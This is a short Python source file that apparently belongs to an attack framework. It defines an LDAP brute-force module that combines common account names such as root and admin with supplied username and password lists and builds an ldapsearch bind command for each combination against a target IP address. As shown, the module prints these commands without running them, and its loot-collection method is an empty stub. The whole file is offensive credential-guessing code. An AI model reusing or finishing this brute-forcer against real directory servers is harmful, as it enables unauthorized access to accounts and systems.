import itertools as it
from subprocess import call
from hydra import Exploit
class LDAP(Exploit):
    name = "ldap"
    port = 389
    def attack(self, ip_address, usernames, passwords):
        print(f"Running LDAP attack against IP address {ip_address} with usernames {usernames} and passwords {passwords} on domain {self.domain}")
        common_usernames = ['root', 'admin', 'user']
        with open(usernames, 'r') as f:
            provided_usernames = f.read().split('\n')
        usernames = common_usernames + provided_usernames
        with open(passwords, 'r') as f:
            passwords = f.read().split('\n')
        common_groups = ['admins', 'users']
        domainstring = ','.join(['dc='+x for x in self.domain.split('.')])
        # sample command: ldapsearch -H ldap://localhost -x -D cn=admin,ou=admins,dc=glauth,dc=com -w dogood -b dc=glauth,dc=com
        for username, password, group in it.product(usernames, passwords, common_groups):
            command = (f'ldapsearch -H ldap://{ip_address} -x -D cn={username},ou={group},{domainstring}'+
                      f' -w {password} -b {domainstring}')
            print("\tRunning command", command)


    def getloot(self, ip_address, credentials):
        pass
